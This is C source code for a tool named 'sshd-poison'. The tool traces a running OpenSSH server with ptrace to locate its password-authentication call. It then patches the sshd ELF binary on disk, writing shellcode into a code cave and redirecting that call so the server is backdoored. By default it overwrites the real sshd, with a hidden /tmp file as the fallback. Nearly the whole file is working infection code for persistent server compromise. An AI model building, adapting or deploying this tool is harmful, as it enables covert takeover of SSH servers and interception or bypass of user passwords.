#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/reg.h>
#include <sys/stat.h>

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <fcntl.h>
#include <errno.h>

#include <ignotum.h>

#include "ptrace-loop.h"
#include "breakpoint.h"
#include "caves.h"
#include "ssh-client.h"
#include "ssh-server.h"
#include "memutils.h"
#include "authpassword-scan.h"
#include "elf-parser.h"
#include "output.h"

#include "sc.h"

#define PASSWORD "ecclesiastes 12:7"

struct {
	uint64_t calloffset;
	char opcode[4];
} hook_info;

struct {
	char *sshd;
	char *sshd_log_output;
	char *ssh_client;
	char *output;
	int yes;
} options;

/* ptrace_loop callbacks */

int wait_event_exec(struct ptrace_info *info)
{
	int status = info->status;
	return (WIFSTOPPED(status) && (status >> 16) == PTRACE_EVENT_EXEC);
}

int ep_breakpoint(struct ptrace_info *info)
{
	struct breakpoint *bp = info->aux;
	int stop = 0;

	int status = info->status;
	if (!WIFSTOPPED(status))
		goto end;

	if (WSTOPSIG(status) == SIGTRAP && breakpoint_hit(bp, info->pid)) {
		disable_breakpoint(bp, info->pid);
		stop = 1;
	}

end:
	return stop;
}

/* mm_answer_authpassword */
int authpassword_breakpoint(struct ptrace_info *info)
{
	struct breakpoint *bp = info->aux;
	int stop = 0;

	int status = info->status;
	if (!WIFSTOPPED(status))
		goto end;

	if (WSTOPSIG(status) == SIGTRAP && breakpoint_hit(bp, info->pid)) {
		disable_breakpoint(bp, info->pid);
		say("breakpoint reached\n");
		stop = 1;
	}

end:
	return stop;
}

int auth_password_offset(struct ptrace_info *info)
{
	static struct breakpoint bp;
	static char pw[sizeof(PASSWORD)];

	int stop = 0;

	uint64_t rsi, rip;
	unsigned char next_instruction;

	if (info->op == PTRACE_SINGLESTEP) {
		rip = ptrace(PTRACE_PEEKUSER, info->pid, RIP * 8, 0);
		ignotum_mem_read(info->pid, &next_instruction, 1, rip);

		/* e8 = call */
		if (next_instruction == 0xe8) {
			say("function call detected\n");
			rsi = ptrace(PTRACE_PEEKUSER, info->pid, RSI * 8, 0);
			if (ignotum_mem_read(info->pid, pw, sizeof(pw), rsi) != sizeof(pw))
				goto set_breakpoint;

			if (!strcmp(pw, PASSWORD)) {
				say("auth_password function called at 0x%zx\n", rip);
				if (ignotum_mem_read(info->pid, hook_info.opcode,
					sizeof(hook_info.opcode), rip + 1) != sizeof(hook_info.opcode)) {
					say("failed to read call instruction\n");
					_exit(1);
				}

				hook_info.calloffset = rip;
				stop = 1;
				goto end;
			}

set_breakpoint:
			/* call xx xx xx xx */
			if (enable_breakpoint(&bp, info->pid, rip + 5)) {
				say("failed to set breakpoint at 0x%zx\n", rip + 5);
				_exit(1);
			}

			say("breakpoint set at 0x%zx\n", rip + 5);

			info->op = PTRACE_CONT;
		}
	}

	else {
		if (WSTOPSIG(info->status) == SIGTRAP && breakpoint_hit(&bp, info->pid)) {
			say("breakpoint reached\n");
			disable_breakpoint(&bp, info->pid);
			info->op = PTRACE_SINGLESTEP;
		}
	}

end:
	return stop;
}

int offset_scan(elf_t *elf, const char *sshd, pid_t pid)
{
	uint64_t entry_point, mm_answer_authpassword, base_addr;

	struct breakpoint bp;
	struct ptrace_info info;

	say("starting debug the pid %d...\n", pid);
	if (ptrace_start(&info, pid, PTRACE_O_TRACEEXEC)) {
		say("can't debug the pid\n");
		return 1;
	}

	say("waiting sshd start execution...\n");
	if (ptrace_loop(&info, wait_event_exec)) {
		say("can't execute sshd\n");
		return 1;
	}

	entry_point = get_pid_entry_point(elf, pid);
	say("entry point address: 0x%zx\n", entry_point);

	say("setting a breakpoint in the entry point...\n");
	if (enable_breakpoint(&bp, pid, entry_point)) {
		say("failed to set the breakpoint\n");
		return 1;
	}

	info.aux = &bp;
	if (ptrace_loop(&info, ep_breakpoint)) {
		say("breakpoint not reached\n");
		return 1;
	}

	say("ep breakpoint reached\n");

	base_addr = get_base_address(pid, sshd, 0);
	if (!base_addr) {
		say("can't get the pid base address\n");
		return 1;
	}

	say("base address: 0x%zx\n", base_addr);

	say("searching mm_answer_authpassword address...\n");
	mm_answer_authpassword = get_mm_answer_authpassword(pid, sshd);
	if (mm_answer_authpassword == (uint64_t)-1) {
		say("mm_answer_authpassword not found\n");
		return 1;
	}

	say("mm_answer_authpassword address: 0x%zx\n", mm_answer_authpassword);
	mm_answer_authpassword -= base_addr;
	say("mm_answer_authpassword offset: 0x%zx\n", mm_answer_authpassword);

	say("launching ssh client in background\n");
	exec_ssh_client(options.ssh_client, (char * const []) {
		"ssh", "p01s0n@localhost",
		"-p", "50135",
		"-o", "UserKnownHostsFile=/dev/null",
		"-o", "StrictHostKeyChecking=no", NULL
	}, PASSWORD "\n");

	say("waiting for sshd rexec...\n");
	if (ptrace_loop(&info, wait_event_exec)) {
		say("sshd rexec failed\n");
		return 1;
	}

	say("sshd rexec done!\n");

	base_addr = get_base_address(pid, sshd, 0);
	if (!base_addr) {
		say("failed to get new base address\n");
		return 1;
	}

	say("new base address (for PIE): 0x%zx\n", base_addr);

	mm_answer_authpassword += base_addr;
	say("setting a breakpoint in 0x%zx (mm_answer_authpassword)\n",
		mm_answer_authpassword);

	if (enable_breakpoint(&bp, pid, mm_answer_authpassword)) {
		say("failed to set the breakpoint\n");
		return 1;
	}

	if (ptrace_loop(&info, authpassword_breakpoint)) {
		say("breakpoint not reached\n");
		return 1;
	}

	info.op = PTRACE_SINGLESTEP;
	if (ptrace_loop(&info, auth_password_offset)) {
		say("failed to get auth_password offset\n");
		return 1;
	}

	hook_info.calloffset -= base_addr;
	kill(pid, SIGKILL);

	/* wait some child from sshd exit */
	sleep(1);

	return 0;
}

void copy_to_fd(const char *filename, int fd)
{
	char buf[8192];
	ssize_t n;
	int rfd;

	rfd = open(filename, O_RDONLY);
	if (rfd == -1) {
		say("can't open %s (%s)\n", filename, strerror(errno));
		_exit(1);
	}

	while ((n = read(rfd, buf, sizeof(buf))) > 0) {
		if (write(fd, buf, n) != n) {
			say("write failed %s\n", strerror(errno));
			_exit(1);
		}
	}

	close(rfd);
}

int ask_question(void)
{
	say("can't edit the original file\n");
	say("do you want to save the infected file to a temporary file [y]? ");
	fflush(stdout);

	return (getchar() == 'y');
}

int get_file_mode(const char *filename)
{
	struct stat st;
	if (stat(filename, &st) == -1) {
		return 0755;
	}

	return st.st_mode;
}

int prepare_output_fd(const char *sshd, char *name)
{
	int fd;

	if (options.output == NULL) {
		fd = open(sshd, O_WRONLY);
		if (fd != -1)
			goto end;

		say("can't open %s (%s)\n", sshd, strerror(errno));
		if (!options.yes && !ask_question()) {
			say("aborting operation\n");
			_exit(1);
		}

		fd = mkstemp(name);
		if (fd == -1) {
			say("failed to create temporary file\n");
			_exit(1);
		}

		else
			say("sshd infected file: %s\n", name);

	}

	else {
		fd = open(options.output, O_WRONLY | O_CREAT | O_TRUNC, 0600);
		if (fd == -1) {
			say("can't open %s (%s)\n", options.output, strerror(errno));
			_exit(1);
		}

	}

	fchmod(fd, get_file_mode(sshd));
	copy_to_fd(sshd, fd);

end:
	return fd;
}

int infect_sshd(const char *sshd, uint64_t caveoffset)
{
	char tmp[32] = "/tmp/.XXXXXXXXXX";

	int32_t new_call_offset, orig_auth_password_jmp;
	int64_t auth_password_offset;

	int fd;

	/* call address arithmethic is like:
	 * call ip + 5 + (int32_t) call value */
	auth_password_offset = (int64_t) hook_info.calloffset + 5;
	auth_password_offset += *(int32_t *)hook_info.opcode;

	/* new call e8 (xx xx xx xx) address */
	new_call_offset = (int32_t) hook_info.calloffset + 5;
	/* +5 skip first JMP in shellcode */
	new_call_offset = caveoffset - new_call_offset + 5;

	/* jmp e9 (xx xx xx xx) address */
	orig_auth_password_jmp = (int32_t)auth_password_offset - ((int32_t)caveoffset + 5);
	*(int32_t *)(_bin_sc + 1) = orig_auth_password_jmp;

	say("auth_password offset: 0x%zx\n", auth_password_offset);
	say("new call offset: 0x%x\n", new_call_offset);

	fd = prepare_output_fd(sshd, tmp);

	/* replace call xx xx xx xx <auth_password> */
	pwrite(fd, &new_call_offset, sizeof(new_call_offset), hook_info.calloffset + 1);

	/* write shellcode to code cave */
	pwrite(fd, _bin_sc, _bin_sc_len, caveoffset);

	close(fd);

	return 0;
}

void help(void)
{
	static const char menu[]=
		"sshd-poison [OPTIONS] [sshd-elf]\n"
		"Options:\n"
		" -s [FILE]   ssh client filename\n"
		" -o [FILE]   save infected elf to another location\n"
		" -O [FILE]   sshd log output (Default: stderr)\n"
		" -y          don't ask any question\n"
	;

	say("%s", menu);
}

/* a beautiful banner */
void banner(void)
{
	static const char ascii[]=
		"                   .\n"
		"         /^\\     .\n"
		"    /\\   \"V\"\n"
		"   /__\\   I      O  o\n"
		"  //..\\\\  I     .\n"
		"  \\].`[/  I\n"
		"  /l\\/j\\  (]    .  O\n"
		" /. ~~ ,\\/I          .\n"
		" \\\\L__j^\\/I       o\n"
		"  \\/--v}  I     o   .\n"
		"  |    |  I   _________\n"
		"  |    |  I c(`       ')o\n"
		"  |    l  I   \\.     ,/\n"
		"_/j  L l\\_!  _//^---^\\\\_    -Row\n";

	puts(ascii);
}

void parser_opts(int argc, char **argv)
{
	int opt;

	options.ssh_client = "ssh";
	while ((opt = getopt(argc, argv, "s:o:O:y")) != -1) {
		switch (opt) {
		case 's':
			options.ssh_client = optarg;
			break;
		case 'o':
			options.output = optarg;
			break;
		case 'O':
			options.sshd_log_output = optarg;
			break;
		case 'y':
			options.yes = 1;
			break;
		}
	}

	options.sshd = argv[optind];
}

int main(int argc, char **argv)
{
	uint64_t caveoffset, len;
	char *hostkey;
	elf_t elf;
	pid_t pid;

	banner();

	parser_opts(argc, argv);
	if (options.sshd == NULL) {
		help();
		return 1;
	}

	if (options.sshd[0] != '/') {
		say("you must pass the full path filename\n");
		return 1;
	}

	if (strstr(options.sshd, "//")) {
		say("invalid filename\n");
		return 1;
	}

	say("parsing elf file...\n");
	elf_parser(&elf, options.sshd);

	say("checking elf code caves...\n");
	caveoffset = xcave(&len, &elf);
	if (!caveoffset) {
		say("code cave not found...\n");
		return 1;
	}

	say("cave offset: 0x%zx\n", caveoffset);
	say("cave size: %zu\n", len);

	if (len < _bin_sc_len) {
		say("code cave is too small, can't continue\n");
		say("%zu bytes avaliable, %u bytes required for the shellcode\n", len, _bin_sc_len);
		return 1;
	}

	say("creating a temporary hostkey file...\n");

	hostkey = create_hostkey();
	if (hostkey == NULL) {
		say("failed to create the file...\n");
		return 1;
	}

	say("%s\n", hostkey);

	say("start running sshd in background\n");
	pid = exec_ssh_server(options.sshd_log_output,
		options.sshd, (char * const []) {
		(char * const)options.sshd,
		"-f", "/dev/null",
		"-o", hostkey,
		"-o", "ListenAddress=127.0.0.1",
		"-p", "50135",
		"-ddd",
		NULL
	});

	if (pid == -1) {
		say("fork failed\n");
		return 1;
	}

	if (offset_scan(&elf, options.sshd, pid))
		return 1;

	return infect_sshd(options.sshd, caveoffset);
}
